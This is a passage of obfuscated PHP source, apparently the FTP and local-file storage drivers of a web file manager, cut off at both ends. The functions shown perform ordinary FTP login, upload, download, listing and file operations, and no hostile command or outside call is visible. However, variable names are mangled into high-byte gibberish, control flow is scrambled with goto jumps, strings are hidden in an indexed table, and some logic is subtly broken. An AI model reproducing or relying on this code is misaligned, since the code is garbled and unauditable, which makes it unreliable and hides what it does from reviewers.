ltrim($C¢¥ÂÌÆ­É, $E¢„÷í°ÈÇ[8]); goto fŠ¸ßœ¬äë; A½©¥„‘‹: $E¢„÷í°ÈÇ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FïîßíÜµ = $this->iconvApp($this->pathBase); $C¢¥ÂÌÆ­É = $this->iconvApp($C¢¥ÂÌÆ­É); goto Aİ¶¾ƒ’è±; Aİ¶¾ƒ’è±: if (substr($FïîßíÜµ, 0, 2) == $E¢„÷í°ÈÇ[1161]) { $FïîßíÜµ = BASIC_PATH . substr($FïîßíÜµ, 2); } if (substr($C¢¥ÂÌÆ­É, 0, 2) == $E¢„÷í°ÈÇ[1161]) { $C¢¥ÂÌÆ­É = BASIC_PATH . substr($C¢¥ÂÌÆ­É, 2); } $FïîßíÜµ = KodIO::clear($FïîßíÜµ); goto cõòáÏ÷Öç; cõòáÏ÷Öç: $C¢¥ÂÌÆ­É = KodIO::clear($C¢¥ÂÌÆ­É); $C¢¥ÂÌÆ­É = substr($C¢¥ÂÌÆ­É, strlen($FïîßíÜµ)); if (empty($this->pathDriver)) { return $C¢¥ÂÌÆ­É; } goto aÊÉâ½Šè; fŠ¸ßœ¬äë: } private function _init($cÅåì¥â«† = array()) { $F×‡Á ¡§ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!function_exists($F×‡Á ¡§[1162])) { show_json(LNG($F×‡Á ¡§[1163]), !1); } $this->config = $cÅåì¥â«†; $this->charsetReset($cÅåì¥â«†); foreach ($cÅåì¥â«† as $cª®®è¯Ü => $FÄ·’•à») { if (isset($this->{$cª®®è¯Ü})) { $this->{$cª®®è¯Ü} = $FÄ·’•à»; } } return $this->_login($cÅåì¥â«†); } private function _login($CÉƒİ¿Ÿ¡ƒ) { goto e¹†ˆÄëŠÂ; e¹†ˆÄëŠÂ: $BÆŒ¤«äÏù =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $c›‰¦Šñ÷É = array(); $fÖ¤Í ³¡Ö = md5(json_encode($CÉƒİ¿Ÿ¡ƒ)); goto DÄ„ÙƒÀ³Å; A°Úò°‰ä: $c›‰¦Šñ÷É[$fÖ¤Í ³¡Ö] = array($BÆŒ¤«äÏù[1167] => $this->connect, $BÆŒ¤«äÏù[169] => $this->host, $BÆŒ¤«äÏù[168] => $this->scheme, $BÆŒ¤«äÏù[170] => $this->port); return $BÁÆõ‰é”÷; goto C²«‚¼¨…; EÊè‚öÈĞá: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $E…½ò¦õ„„ = $this->pasv == $BÆŒ¤«äÏù[83] ? !0 : !1; @ftp_pasv($this->connect, $E…½ò¦õ„„); goto A°Úò°‰ä; f©´Ôè Ğ†: $bÜ»ÓâÈëÖ = isset($A¢˜Ãğè¶[$BÆŒ¤«äÏù[168]]) && $A¢˜Ãğè¶[$BÆŒ¤«äÏù[168]] == $BÆŒ¤«äÏù[1164] ? !0 : !1; $this->scheme = $bÜ»ÓâÈëÖ ? $BÆŒ¤«äÏù[1165] : $BÆŒ¤«äÏù[1166]; $this->port = isset($A¢˜Ãğè¶[$BÆŒ¤«äÏù[170]]) ? $A¢˜Ãğè¶[$BÆŒ¤«äÏù[170]] : 21; goto D¥ÅøŞ•Ë‘; DÄ„ÙƒÀ³Å: if (isset($c›‰¦Šñ÷É[$fÖ¤Í ³¡Ö])) { foreach ($c›‰¦Šñ÷É[$fÖ¤Í ³¡Ö] as $B˜ñäöåËñ => $bæõÛø¿Ö¯) { $this->{$B˜ñäöåËñ} = $bæõÛø¿Ö¯; } return !0; } $A¢˜Ãğè¶ = parse_url(trim($this->server, $BÆŒ¤«äÏù[8])); $this->host = $A¢˜Ãğè¶[$BÆŒ¤«äÏù[169]]; goto f©´Ôè Ğ†; D¥ÅøŞ•Ë‘: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $BÁÆõ‰é”÷ = @ftp_login($this->connect, $this->username, $this->userpass); goto EÊè‚öÈĞá; C²«‚¼¨…: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($b´ä•­Ş”, $f‚Š¹ø•„ = '', $B‘¼ç°àØ« = REPEAT_RENAME) { if ($this->setContent($b´ä•­Ş”, $f‚Š¹ø•„)) { return $this->getPathOuter($b´ä•­Ş”); } return !1; } public function mkdir($e³‰‰ÙÏ§, $FÛÛ ïÑƒ¥ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $e³‰‰ÙÏ§ = $this->iconvSystem($e³‰‰ÙÏ§); if ($this->isFolder($e³‰‰ÙÏ§) || @ftp_mkdir($this->connect, $e³‰‰ÙÏ§)) { return $this->getPathOuter($e³‰‰ÙÏ§); } if (!$this->mkdir($this->pathFather($e³‰‰ÙÏ§))) { return !1; } if ($e³‰‰ÙÏ§ = @ftp_mkdir($this->connect, $e³‰‰ÙÏ§)) { return $this->getPathOuter($e³‰‰ÙÏ§); } return !1; } public function copyFile($CÈÄ­ºØ±ß, $f‘˜Î©ì×Ù) { goto e—ô½‡ƒ»ö; e—ô½‡ƒ»ö: if (!$this->_isconn()) { return !1; } $B‘‹” ²¬Ö = $this->pathThis($this->iconvSystem($CÈÄ­ºØ±ß)); $F•¹«šÙÈ‘ = $this->tempFile($B‘‹” ²¬Ö); goto Dˆöñ¥Š¯‰; B‘ËöË³ÏÛ: $this->tempFileRemve($F•¹«šÙÈ‘); return $cŒ«¡´ó· ; goto Cä‚Œ¥Ôä²; Dˆöñ¥Š¯‰: $Bù—ñ­ŠÎÆ = $this->iconvApp($F•¹«šÙÈ‘); $this->download($CÈÄ­ºØ±ß, $Bù—ñ­ŠÎÆ); $cŒ«¡´ó·  = $this->upload($f‘˜Î©ì×Ù, $Bù—ñ­ŠÎÆ); goto B‘ËöË³ÏÛ; Cä‚Œ¥Ôä²: } public function moveFile($AÓš‡Ë¤ƒ, $cƒÁã¥„†) { if (!$this->_isconn()) { return !1; } $AÓš‡Ë¤ƒ = $this->iconvSystem($AÓš‡Ë¤ƒ); $cƒÁã¥„† = $this->iconvSystem($cƒÁã¥„†); $cˆ±ìÈâñ• = @ftp_rename($this->connect, $AÓš‡Ë¤ƒ, $cƒÁã¥„†); return $cˆ±ìÈâñ• ? $this->getPathOuter($cƒÁã¥„†) : !1; } public function delFile($fœ„£ïƒÎà) { if (!$this->_isconn()) { return !1; } $fœ„£ïƒÎà = $this->iconvSystem($fœ„£ïƒÎà); return @ftp_delete($this->connect, $fœ„£ïƒÎà); } public function delFolder($bäóºÅ¤„‚) { if (!$this->_isconn()) { return !1; } $bäóºÅ¤„‚ = $this->iconvSystem($bäóºÅ¤„‚); $c¨Ğší¬‹ = $this->ftpList($bäóºÅ¤„‚); if (!$c¨Ğší¬‹) { return @ftp_rmdir($this->connect, $bäóºÅ¤„‚); } foreach ($c¨Ğší¬‹ as $aâ¹Éº‹“ò) { if ($this->isFolder($aâ¹Éº‹“ò)) { $aâ¹Éº‹“ò = $this->iconvApp($aâ¹Éº‹“ò); $this->delFolder($aâ¹Éº‹“ò); } else { @ftp_delete($this->connect, $aâ¹Éº‹“ò); } } return @ftp_rmdir($this->connect, $bäóºÅ¤„‚); } public function rename($fÕáìç±—ˆ, $bŸÉÄ‚‘£) { goto E‹™¬ó²Ë•; CÇíéÛÔÎ: $f‚ìÔØñïâ = $this->iconvSystem($f‚ìÔØñïâ); $fÕáìç±—ˆ = $this->iconvSystem($fÕáìç±—ˆ); $eñÒÉÂ¨Ïï = $this->pathFather($fÕáìç±—ˆ); goto b†ƒ¡È×“; A•±†½Íö : return $b‘™Á¸ÔÕ³ ? $this->getPathOuter($Eµ°ÄíŠ ) : !1; goto cÒ‹ˆ×š†; E‹™¬ó²Ë•: $F¿©ìóöŠÌ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->_isconn()) { return !1; } $f‚ìÔØñïâ = $this->fileNameAuto($this->pathFather($fÕáìç±—ˆ), $bŸÉÄ‚‘£); goto CÇíéÛÔÎ; b†ƒ¡È×“: $Eµ°ÄíŠ  = rtrim($eñÒÉÂ¨Ïï, $F¿©ìóöŠÌ[8]) . $F¿©ìóöŠÌ[8] . $f‚ìÔØñïâ; $b‘™Á¸ÔÕ³ = @ftp_rename($this->connect, $fÕáìç±—ˆ, $Eµ°ÄíŠ ); $Eµ°ÄíŠ  = $this->iconvApp($Eµ°ÄíŠ ); goto A•±†½Íö ; cÒ‹ˆ×š†: } private function folderInfo($b‚°Ì‘¡«å, $F£¤´â‘‘ = false) { goto BÕîë·¼Î; BÕîë·¼Î: $AìœÌ»£åŒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A‹Ö¯¦¡ó = $this->getPathOuter(rtrim($b‚°Ì‘¡«å, $AìœÌ»£åŒ[8])); $B§‡Æ¢ôŸ = $this->pathThis($A‹Ö¯¦¡ó); goto cï¥´¬¿¸; fçœñªÄˆ¨: return $d¬åêŒ¡Ÿ; goto Aƒ‘Õ§º; cï¥´¬¿¸: $EØã¢ÏÊ–– = $this->iconvSystem($b‚°Ì‘¡«å); if ($F£¤´â‘‘) { return array($AìœÌ»£åŒ[28] => $B§‡Æ¢ôŸ, $AìœÌ»£åŒ[75] => $A‹Ö¯¦¡ó, $AìœÌ»£åŒ[29] => $AìœÌ»£åŒ[76]); } $d¬åêŒ¡Ÿ = array($AìœÌ»£åŒ[28] => $B§‡Æ¢ôŸ, $AìœÌ»£åŒ[75] => $A‹Ö¯¦¡ó, $AìœÌ»£åŒ[29] => $AìœÌ»£åŒ[76], $AìœÌ»£åŒ[187] => 0, $AìœÌ»£åŒ[107] => 0, $AìœÌ»£åŒ[1168] => !0, $AìœÌ»£åŒ[1169] => !0); goto fçœñªÄˆ¨; Aƒ‘Õ§º: } private function fileInfo($A¯Šè·íöâ, $BÍùùƒ›ŸÆ = false) { goto F¥íáºáÛ; D‰‰Ñîè‹: $FÌ¥Å¼İ = $this->iconvSystem($A¯Šè·íöâ); if ($BÍùùƒ›ŸÆ) { return array($bêÄñ½‘½[28] => $dº‹»™ô, $bêÄñ½‘½[75] => $c¸„ÀŸÔ‡‡, $bêÄñ½‘½[29] => $bêÄñ½‘½[167], $bêÄñ½‘½[160] => $this->ext($A¯Šè·íöâ), $bêÄñ½‘½[77] => $this->size($A¯Šè·íöâ)); } $eŞ—ÂÎ”Ê = array($bêÄñ½‘½[28] => $dº‹»™ô, $bêÄñ½‘½[75] => $c¸„ÀŸÔ‡‡, $bêÄñ½‘½[29] => $bêÄñ½‘½[167], $bêÄñ½‘½[187] => 0, $bêÄñ½‘½[107] => @ftp_mdtm($this->connect, $FÌ¥Å¼İ), $bêÄñ½‘½[160] => $this->ext($A¯Šè·íöâ), $bêÄñ½‘½[77] => $this->size($A¯Šè·íöâ), $bêÄñ½‘½[1168] => !0, $bêÄñ½‘½[1169] => !0); goto D’ˆ™Ò™Ó¯; D’ˆ™Ò™Ó¯: $eŞ—ÂÎ”Ê[$bêÄñ½‘½[107]] = $eŞ—ÂÎ”Ê[$bêÄñ½‘½[107]] > 0 ? $eŞ—ÂÎ”Ê[$bêÄñ½‘½[107]] : 0; return $eŞ—ÂÎ”Ê; goto f¥“¹šï™; F¥íáºáÛ: $bêÄñ½‘½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c¸„ÀŸÔ‡‡ = $this->getPathOuter(rtrim($A¯Šè·íöâ, $bêÄñ½‘½[8])); $dº‹»™ô = $this->pathThis($c¸„ÀŸÔ‡‡); goto D‰‰Ñîè‹; f¥“¹šï™: } public function size($eÎ‰´¸Ÿê¼) { $Eá¤®Ê¬à‡ = $this->objectMeta($eÎ‰´¸Ÿê¼); return $Eá¤®Ê¬à‡ ? $Eá¤®Ê¬à‡[$_SERVER[³‘’¼äÑ™ÔÍ][77]] : 0; } public function info($BÄÃØ†˜í®) { if ($this->isFile($BÄÃØ†˜í®)) { return $this->fileInfo($BÄÃØ†˜í®, 0); } else { if ($this->isFolder($BÄÃØ†˜í®)) { return $this->folderInfo($BÄÃØ†˜í®); } } return !1; } public function exist($dÃôáîÕŠ›) { return $this->objectMeta($dÃôáîÕŠ›) ? !0 : !1; } public function isFile($fô¸ø¼×”ë) { $B¶æóÆ® =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C²Ç¸¢® = $this->objectMeta($fô¸ø¼×”ë); return $C²Ç¸¢® ? $C²Ç¸¢®[$B¶æóÆ®[29]] == $B¶æóÆ®[167] : !1; } public function isFolder($d±­ÓÉ»Å) { $CµìÈ¾Ã¦ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¶ÜÔÕ­ = $this->objectMeta($d±­ÓÉ»Å); return $A¶ÜÔÕ­ ? $A¶ÜÔÕ­[$CµìÈ¾Ã¦[29]] == $CµìÈ¾Ã¦[76] : !1; } public function listPath($E½Õ™¶é†é, $C¿×ê¼ù¼‚ = false) { goto BãŠØê’Â; bŒÚ“öŒ„: $EÌÇöÙİ®Î = $this->ftpList($E½Õ™¶é†é); $b¡×ñøˆ† = array($AœÃá´ŞÖ[74] => array(), $AœÃá´ŞÖ[73] => array()); if (!$EÌÇöÙİ®Î) { return $b¡×ñøˆ†; } goto AÃÚ½ĞÀ›Õ; AÃÚ½ĞÀ›Õ: foreach ($EÌÇöÙİ®Î as $E½Õ™¶é†é) { if ($this->isFolder($E½Õ™¶é†é)) { $b¡×ñøˆ†[$AœÃá´ŞÖ[74]][] = $this->folderInfo($E½Õ™¶é†é, $C¿×ê¼ù¼‚); } else { $b¡×ñøˆ†[$AœÃá´ŞÖ[73]][] = $this->fileInfo($E½Õ™¶é†é, $C¿×ê¼ù¼‚); } } return $b¡×ñøˆ†; goto D»—‡­íÖÔ; BãŠØê’Â: $AœÃá´ŞÖ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->_isconn()) { return !1; } $E½Õ™¶é†é = $this->iconvSystem($E½Õ™¶é†é); goto bŒÚ“öŒ„; D»—‡­íÖÔ: } public function has($a—•¦µ®â£, $bØªâµÜÅ = false, $b½ğ¤ÀÈ—ç = true) { goto f´ëõ‰›¶‰; f´ëõ‰›¶‰: $e™­‰Â·–¡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->_isconn()) { return !1; } $a—•¦µ®â£ = $this->iconvSystem($a—•¦µ®â£); goto B‰•ˆƒ¶; B‰•ˆƒ¶: $bº¼É¬Â«ù = $this->ftpList($a—•¦µ®â£); if (!$bº¼É¬Â«ù) { return !1; } if ($bØªâµÜÅ) { return array($e™­‰Â·–¡[191] => 0, $e™­‰Â·–¡[192] => count($bº¼É¬Â«ù)); } goto dÜÇ´§¥ß²; dÜÇ´§¥ß²: foreach ($bº¼É¬Â«ù as $a—•¦µ®â£) { if ($b½ğ¤ÀÈ—ç) { if (!$this->isFolder($a—•¦µ®â£)) { return !0; } } else { if ($this->isFolder($a—•¦µ®â£)) { return !0; } } } return !1; goto BÌËÛ¹š£³; BÌËÛ¹š£³: } public function listAll($eÉôî¦¨¿ã) { goto A¬¦„ìˆÂ; Dæïá”çà: foreach ($e‰ì”‹ŠÜ[$c…ñŸ—ºø˜[74]] as $f¦Ÿ†Ğ˜ØÑ) { $f·À¹¯¶‹â[] = array($c…ñŸ—ºø˜[75] => $c…ñŸ—ºø˜[8] . trim(str_replace($eÉôî¦¨¿ã, $c…ñŸ—ºø˜[33], $f¦Ÿ†Ğ˜ØÑ), $c…ñŸ—ºø˜[8]) . $c…ñŸ—ºø˜[8], $c…ñŸ—ºø˜[76] => 1, $c…ñŸ—ºø˜[77] => 0); } foreach ($e‰ì”‹ŠÜ[$c…ñŸ—ºø˜[73]] as $b«æĞ«¨ƒî) { $f·À¹¯¶‹â[] = array($c…ñŸ—ºø˜[75] => $c…ñŸ—ºø˜[8] . trim(str_replace($eÉôî¦¨¿ã, $c…ñŸ—ºø˜[33], $b«æĞ«¨ƒî), $c…ñŸ—ºø˜[8]), $c…ñŸ—ºø˜[76] => 0, $c…ñŸ—ºø˜[77] => $this->size($b«æĞ«¨ƒî)); } return $f·À¹¯¶‹â; goto eÂ…ÃÊÍíÛ; b¼‡™ªÁâÆ: $e‰ì”‹ŠÜ = array($c…ñŸ—ºø˜[73] => array(), $c…ñŸ—ºø˜[74] => array()); $this->recursionFtpFiles($eÉôî¦¨¿ã, $e‰ì”‹ŠÜ); $f·À¹¯¶‹â = array(); goto Dæïá”çà; A¬¦„ìˆÂ: $c…ñŸ—ºø˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->_isconn()) { return !1; } $eÉôî¦¨¿ã = $this->iconvSystem($eÉôî¦¨¿ã); goto b¼‡™ªÁâÆ; eÂ…ÃÊÍíÛ: } public function getContent($b½É–©Ğ–¶) { if (!$this->_isconn()) { return !1; } $b½É–©Ğ–¶ = $this->iconvSystem($b½É–©Ğ–¶); return $this->fileSubstr($b½É–©Ğ–¶); } public function setContent($C…ÄãÙÃ­Ê, $A¿ª“Ø § = '') { goto Cšä’ÒÒè; BÂíÎÑä·È: return $BÅßÅ–‘¿; goto CÙÔ‰ŸÎ°â; Cšä’ÒÒè: if (!$this->_isconn()) { return !1; } $DèŠÖÕ£²Ë = $this->pathThis($this->iconvSystem($C…ÄãÙÃ­Ê)); $DÖ—Ø÷ = $this->tempFile($DèŠÖÕ£²Ë); goto dß¦ÁâÔÀ„; dß¦ÁâÔÀ„: file_put_contents($DÖ—Ø÷, $A¿ª“Ø §); $BÅßÅ–‘¿ = $this->upload($C…ÄãÙÃ­Ê, $this->iconvApp($DÖ—Ø÷)); $this->tempFileRemve($DÖ—Ø÷); goto BÂíÎÑä·È; CÙÔ‰ŸÎ°â: } public function fileSubstr($B‡ë÷¦‹Ú…, $C†©ÔõÕÛ§ = 0, $bæÂ›Şè« = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($B‡ë÷¦‹Ú…, $C†©ÔõÕÛ§, $bæÂ›Şè«); } private function ftpRequest($Cœ‹ÎÌ×îÊ, $b§©»ÌÃó = 0, $A¨Òé‹À°ß = false) { goto D „›´åÈ; D „›´åÈ: $Cœ‹ÎÌ×îÊ = $this->iconvSystem($Cœ‹ÎÌ×îÊ); $BÙÉŠŒº©Å = $this->scheme . $this->host . $_SERVER[³‘’¼äÑ™ÔÍ][4] . $this->port; $Cë§çîŒ¬½ = curl_init(); goto dÆ¹¿õâøš; A‘±»º‡: curl_setopt($Cë§çîŒ¬½, CURLOPT_RETURNTRANSFER, 1); $EôÔòë†‘· = curl_exec($Cë§çîŒ¬½); curl_close($Cë§çîŒ¬½); goto Eà§Ö¶»÷†; Eà§Ö¶»÷†: return $EôÔòë†‘·; goto b‹˜„»‚çä; dÆ¹¿õâøš: curl_setopt($Cë§çîŒ¬½, CURLOPT_URL, $BÙÉŠŒº©Å . $this->pathEncode($Cœ‹ÎÌ×îÊ)); curl_setopt($Cë§çîŒ¬½, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($A¨Òé‹À°ß) { $D™Êäƒ±‰‹ = $b§©»ÌÃó + $A¨Òé‹À°ß - 1; curl_setopt($Cë§çîŒ¬½, CURLOPT_RANGE, "{$b§©»ÌÃó}\x2d{$D™Êäƒ±‰‹}"); } goto A‘±»º‡; b‹˜„»‚çä: } public function upload($eŠÖÎêÜËÀ, $dß»™½µ”Æ, $F¡·´ßƒŞ = false, $fà†µÍ¶²† = REPEAT_REPLACE) { goto a›¸†Øô³; a›¸†Øô³: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($eŠÖÎêÜËÀ))) { return !1; } $eŠÖÎêÜËÀ = $this->iconvSystem($eŠÖÎêÜËÀ); goto bŠ ÈªàÎó; bŠ ÈªàÎó: $dß»™½µ”Æ = $this->iconvSystem($dß»™½µ”Æ); $cÌÜğ¥óŞ¢ = ftp_nb_put($this->connect, $eŠÖÎêÜËÀ, $dß»™½µ”Æ, FTP_BINARY); while ($cÌÜğ¥óŞ¢ == FTP_MOREDATA) { $cÌÜğ¥óŞ¢ = ftp_nb_continue($this->connect); } goto aÏ®÷²¢„Ö; aÏ®÷²¢„Ö: if ($cÌÜğ¥óŞ¢ != FTP_FINISHED) { return !1; } return $this->getPathOuter($eŠÖÎêÜËÀ); goto CÀÈÉî³âä; CÀÈÉî³âä: } public function download($B•öòø³–È, $B˜…¢©ïÒé = '') { goto bçªÀ¤øõ±; bçªÀ¤øõ±: if (!$this->_isconn()) { return !1; } $b³ğõË‰Ê = $this->pathFather($B˜…¢©ïÒé); if (!IO::mkdir($b³ğõË‰Ê)) { return !1; } goto cÖ…‡¹·Í; cÖ…‡¹·Í: $B•öòø³–È = $this->iconvSystem($B•öòø³–È); $B˜…¢©ïÒé = $this->iconvSystem($B˜…¢©ïÒé); $EÅ­ê¸„‰° = ftp_nb_get($this->connect, $B˜…¢©ïÒé, $B•öòø³–È, FTP_BINARY); goto fÍÔÒ‹Ì–; fÍÔÒ‹Ì–: while ($EÅ­ê¸„‰° == FTP_MOREDATA) { $EÅ­ê¸„‰° = ftp_nb_continue($this->connect); } if ($EÅ­ê¸„‰° != FTP_FINISHED) { return !1; } return $this->iconvApp($B˜…¢©ïÒé); goto F¾£ÔÑéì÷; F¾£ÔÑéì÷: } private function ftpList($CˆÍò´½İ) { goto eºœÉÇ; FœŒ¥õì…¬: $CˆÍò´½İ = rtrim($CˆÍò´½İ, $CŒİäõ”œ«[8]) . $CŒİäõ”œ«[8]; $fÑôœ¦¡œ = @ftp_nlist($this->connect, $CˆÍò´½İ); if ($fÑôœ¦¡œ === !1) { $fÑôœ¦¡œ = @ftp_rawlist($this->connect, $CˆÍò´½İ); foreach ($fÑôœ¦¡œ as $eªÖÉÂ–³µ => $e£Ş¿ŒÕÌ) { $fÑôœ¦¡œ[$eªÖÉÂ–³µ] = end(explode($CŒİäõ”œ«[1170], $e£Ş¿ŒÕÌ)); } } goto BÕ§àŸ²è•; F¢Ùº÷Ë»ö: return $b±ßœ¯šçÁ; goto dĞ‹±±‹Ôó; eºœÉÇ: $CŒİäõ”œ« =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->isFolder($CˆÍò´½İ)) { return !1; } @ftp_chdir($this->connect, $CŒİäõ”œ«[8]); goto FœŒ¥õì…¬; BÕ§àŸ²è•: $fÑôœ¦¡œ = array_diff($fÑôœ¦¡œ, array($CŒİäõ”œ«[91], $CŒİäõ”œ«[1171], $CˆÍò´½İ . $CŒİäõ”œ«[91], $CˆÍò´½İ . $CŒİäõ”œ«[1171])); $b±ßœ¯šçÁ = array(); foreach ($fÑôœ¦¡œ as $AËƒ™ãàéß) { if (!strstr($AËƒ™ãàéß, $CŒİäõ”œ«[8])) { $AËƒ™ãàéß = $CˆÍò´½İ . ltrim($AËƒ™ãàéß, $CŒİäõ”œ«[8]); } $b±ßœ¯šçÁ[] = $this->iconvApp($AËƒ™ãàéß); } goto F¢Ùº÷Ë»ö; dĞ‹±±‹Ôó: } private function recursionFtpFiles($Eî„ñÂ¶–¼, &$CÖ×‹ª“‚ ) { $a‚¸¿†óÆñ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->_isconn()) { return !1; } if (!($FŸèŒ„Êá = $this->ftpList($Eî„ñÂ¶–¼))) { return !1; } foreach ($FŸèŒ„Êá as $Eî„ñÂ¶–¼) { if ($this->isFolder($Eî„ñÂ¶–¼)) { $this->recursionFtpFiles($Eî„ñÂ¶–¼, $CÖ×‹ª“‚ ); $CÖ×‹ª“‚ [$a‚¸¿†óÆñ[74]][] = $Eî„ñÂ¶–¼; } else { $CÖ×‹ª“‚ [$a‚¸¿†óÆñ[73]][] = $Eî„ñÂ¶–¼; } } } private function objectMeta($A‚Š¾¹ĞÊÔ) { goto d“õ’¶–…Ÿ; d“õ’¶–…Ÿ: $c˜×“‘Ã›¢ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C’ÅØò„ª¬ = $c˜×“‘Ã›¢[1172] . md5($A‚Š¾¹ĞÊÔ); $Dóğ­½ó¶‘ = Cache::get($C’ÅØò„ª¬); goto Dœ‚µ“¥Ö; Dœ‚µ“¥Ö: if ($Dóğ­½ó¶‘ !== null && $Dóğ­½ó¶‘ !== !1) { return $Dóğ­½ó¶‘; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $c˜×“‘Ã›¢[8]); goto Bµ°£ÖĞ¿¬; d¸²§É´Ø: return $Dóğ­½ó¶‘; goto aáïö„Èø±; Bµ°£ÖĞ¿¬: $cÃ„Ğ±…š¾ = @ftp_size($this->connect, $this->iconvSystem($A‚Š¾¹ĞÊÔ)); if ($cÃ„Ğ±…š¾ != -1) { $Dóğ­½ó¶‘ = array($c˜×“‘Ã›¢[77] => $cÃ„Ğ±…š¾, $c˜×“‘Ã›¢[29] => $c˜×“‘Ã›¢[167]); } else { $fö·‰¦¤¾Ã = @ftp_chdir($this->connect, $this->iconvSystem($A‚Š¾¹ĞÊÔ)); $Dóğ­½ó¶‘ = $fö·‰¦¤¾Ã ? array($c˜×“‘Ã›¢[77] => 0, $c˜×“‘Ã›¢[29] => $c˜×“‘Ã›¢[76]) : !1; } Cache::set($C’ÅØò„ª¬, $Dóğ­½ó¶‘, 0); goto d¸²§É´Ø; aáïö„Èø±: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($aŠ²†´Ú) { if (substr($aŠ²†´Ú, 0, 2) == $_SERVER[³‘’¼äÑ™ÔÍ][1161]) { $aŠ²†´Ú = BASIC_PATH . substr($aŠ²†´Ú, 2); } return $aŠ²†´Ú; } public function iconvApp($E¿‘ºÈ¦ãì) { $d‡Ë³ì‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $config; return $this->iconvTo($E¿‘ºÈ¦ãì, $config[$d‡Ë³ì‹[1159]], $config[$d‡Ë³ì‹[1158]]); } public function iconvSystem($C”ª¹ğÓ³») { $C Ú™„è¢„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; global $config; return $this->iconvTo($C”ª¹ğÓ³», $config[$C Ú™„è¢„[1158]], $config[$C Ú™„è¢„[1159]]); } public function getPathOuter($B‹Íç…³Ì¨) { goto eÚô†ïÓ¬š; eÚô†ïÓ¬š: $cÓ¸§Íëµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‘¼Ì¬™— = $this->iconvApp($this->pathBase); $B‹Íç…³Ì¨ = $this->iconvApp($B‹Íç…³Ì¨); goto eœÃƒ×ö; DÀç£‘‰‡Å: $B‹Íç…³Ì¨ = KodIO::clear($B‹Íç…³Ì¨); $B‹Íç…³Ì¨ = substr($B‹Íç…³Ì¨, strlen($C‘¼Ì¬™—)); if (empty($this->pathDriver)) { return $B‹Íç…³Ì¨; } goto Bõ¼íÅ™½Š; eœÃƒ×ö: if (substr($C‘¼Ì¬™—, 0, 2) == $cÓ¸§Íëµ[1161]) { $C‘¼Ì¬™— = BASIC_PATH . substr($C‘¼Ì¬™—, 2); } if (substr($B‹Íç…³Ì¨, 0, 2) == $cÓ¸§Íëµ[1161]) { $B‹Íç…³Ì¨ = BASIC_PATH . substr($B‹Íç…³Ì¨, 2); } $C‘¼Ì¬™— = KodIO::clear($C‘¼Ì¬™—); goto DÀç£‘‰‡Å; Bõ¼íÅ™½Š: return $this->pathDriver . $cÓ¸§Íëµ[8] . ltrim($B‹Íç…³Ì¨, $cÓ¸§Íëµ[8]); goto c¬ªí°Š£ ; c¬ªí°Š£ : } public function mkfile($EŸİŸ†©ºÃ, $Aİô·š¶„è = '', $F©ââÛ¡ÇÑ = REPEAT_RENAME) { $EŸİŸ†©ºÃ = $this->iconvSystem($EŸİŸ†©ºÃ); @touch($EŸİŸ†©ºÃ); if ($Aİô·š¶„è) { file_put_contents($EŸİŸ†©ºÃ, $Aİô·š¶„è); } return is_file($EŸİŸ†©ºÃ) ? $this->getPathOuter($EŸİŸ†©ºÃ) : !1; } public function mkdir($dñ³›ìÃ¥Á, $e¢ßñÈ™¼à = REPEAT_SKIP) { $dñ³›ìÃ¥Á = $this->iconvSystem($dñ³›ìÃ¥Á); if (is_dir($dñ³›ìÃ¥Á)) { return $this->getPathOuter($dñ³›ìÃ¥Á); } @mkdir($dñ³›ìÃ¥Á, 511, !0); return is_dir($dñ³›ìÃ¥Á) ? $this->getPathOuter($dñ³›ìÃ¥Á) : !1; } public function copyFile($B˜ñ¨‰†µ”, $CÌØåì¶Í±) { $this->mkdir($this->pathFather($CÌØåì¶Í±)); $B˜ñ¨‰†µ” = $this->iconvSystem($B˜ñ¨‰†µ”); $CÌØåì¶Í± = $this->iconvSystem($CÌØåì¶Í±); $B£óŒîÍç— = @copy($B˜ñ¨‰†µ”, $CÌØåì¶Í±); return $B£óŒîÍç— ? $this->getPathOuter($CÌØåì¶Í±) : !1; } public function moveFile($B‹‡»…°Ú˜, $C‚ô•­ˆö) { $this->mkdir($this->pathFather($C‚ô•­ˆö)); $B‹‡»…°Ú˜ = $this->iconvSystem($B‹‡»…°Ú˜); $C‚ô•­ˆö = $this->iconvSystem($C‚ô•­ˆö); $Eë—«ËÄÇ = intval(@rename($B‹‡»…°Ú˜, $C‚ô•­ˆö)); if (!$Eë—«ËÄÇ) { if ($Eë—«ËÄÇ = intval(@copy($B‹‡»…°Ú˜, $C‚ô•­ˆö))) { @unlink($B‹‡»…°Ú˜); } } return $Eë—«ËÄÇ ? $this->getPathOuter($C‚ô•­ˆö) : !1; } public function delFile($cæµÚÚÍ˜) { $cæµÚÚÍ˜ = $this->iconvSystem($cæµÚÚÍ˜); if (!@unlink($cæµÚÚÍ˜)) { @chmod($cæµÚÚÍ˜, 511); if (!@unlink($cæµÚÚÍ˜)) { return !1; } } else { return !0; } } public function delFolder($C™õ‡² ­Ğ) { goto B™ˆô×”‰î; B™ˆô×”‰î: 